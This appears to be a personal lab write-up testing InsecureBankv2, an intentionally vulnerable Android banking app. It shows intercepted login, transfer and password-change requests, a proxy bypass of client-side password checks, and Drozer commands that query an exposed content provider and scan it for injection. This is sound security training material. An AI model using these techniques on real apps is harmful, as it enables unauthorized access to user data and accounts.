# Insecure Bank v2

## Setup

```
git clone https://github.com/dineshshetty/Android-InsecureBankv2.git
cd AndroLabServer
pip install -r requirements.txt
python app.py
```

Create an AVD using Genymotion.
In virtualbox settings: Adapter1 => Bridged, Adapter2 => NAT
My Genymotion wasn't working, but Android Emulator worked.


# Dynamic Analysis
## Login Screen

Intercepting the request in Burp Suite

```
POST /login HTTP/1.1
Content-Length: 40
Content-Type: application/x-www-form-urlencoded
Host: 10.68.0.181:8888
Connection: close
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

username=dinesh&password=Dinesh%40123%24
```

- Trivial SQL injection doesn't work.

## Transfer Screen

Get Accounts

```
POST /getaccounts HTTP/1.1
Content-Length: 40
Content-Type: application/x-www-form-urlencoded
Host: 10.0.2.2:8888
Connection: close
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

username=dinesh&password=Dinesh%40123%24
```

Do Transfer

```
POST /dotransfer HTTP/1.1
Content-Length: 88
Content-Type: application/x-www-form-urlencoded
Host: 10.0.2.2:8888
Connection: close
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

username=dinesh&password=Dinesh%40123%24&from_acc=888888888&to_acc=666666666&amount=2000
```

## Change Password

Client-side check requires password to be complex, but can be circumvented by intercepting and modifying request through a proxy.

```
POST /changepassword HTTP/1.1
Content-Length: 46
Content-Type: application/x-www-form-urlencoded
Host: 10.0.2.2:8888
Connection: close
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

username=dinesh&newpassword=dinesh
```

## Drozer

```
# getting attack surface

dz> run app.package.attacksurface com.android.insecurebankv2
Attack Surface:
  5 activities exported
  1 broadcast receivers exported
  1 content providers exported
  0 services exported
    is debuggable

# content-providers

dz> run app.provider.info -a com.android.insecurebankv2
Package: com.android.insecurebankv2
  Authority: com.android.insecurebankv2.TrackUserContentProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.android.insecurebankv2.TrackUserContentProvider
    Multiprocess Allowed: False
    Grant Uri Permissions: False

# content-provider URIs

dz> run scanner.provider.finduris -a com.android.insecurebankv2
Scanning com.android.insecurebankv2...
Unable to Query  content://com.android.insecurebankv2.TrackUserContentProvider/
Unable to Query  content://com.google.android.gms.games
Unable to Query  content://com.android.insecurebankv2.TrackUserContentProvider
Able to Query    content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
Able to Query    content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
Unable to Query  content://com.google.android.gms.games/

Accessible content URIs:
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/

# content-providers retrieve information

dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
| id | name   |
| 1  | dinesh |
| 2  | dinesh |
| 3  | dinesh |


# content-provider injection

dz> run scanner.provider.injection -a com.android.insecurebankv2
Scanning com.android.insecurebankv2...
Not Vulnerable:
  content://com.android.insecurebankv2.TrackUserContentProvider/
  content://com.google.android.gms.games
  content://com.google.android.gms.games/
  content://com.android.insecurebankv2.TrackUserContentProvider

Injection in Projection:
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/

Injection in Selection:
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
```
